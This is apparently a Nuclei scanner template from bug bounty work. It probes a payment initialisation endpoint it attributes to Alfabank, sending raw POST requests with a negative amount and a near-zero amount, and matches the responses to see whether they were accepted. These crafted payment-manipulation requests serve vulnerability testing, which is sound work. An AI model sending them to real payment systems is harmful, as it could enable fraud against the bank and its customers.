id: alfabank-business-logic-flaws

info:
  name: Alfabank - Business Logic Flaws in Payment
  author: bugbounty
  severity: critical
  description: Business logic flaws allowing negative amounts and zero payments
  tags: business-logic,payment,alfabank
  reference:
    - https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability

http:
  - raw:
      - |
        POST /rest/Init HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: application/json

        {"Amount":-1000,"OrderId":"{{randstr}}"}

      - |
        POST /rest/Init HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: application/json

        {"Amount":0.01,"OrderId":"{{randstr}}"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        part: content_type
        words:
          - "application/json"

      - type: regex
        part: body
        regex:
          - '"(success|orderId|formUrl)"?\s*:\s*"?[a-zA-Z0-9_-]+'
          - '"errorCode"?\s*:\s*"?0"?'
        condition: or

      - type: dsl
        dsl:
          - '!contains(tolower(body), "error")'
          - '!contains(tolower(body), "invalid")'
          - '!contains(tolower(body), "denied")'
        condition: and

    extractors:
      - type: json
        part: body
        json:
          - '.orderId'
          - '.formUrl'
          - '.errorCode'
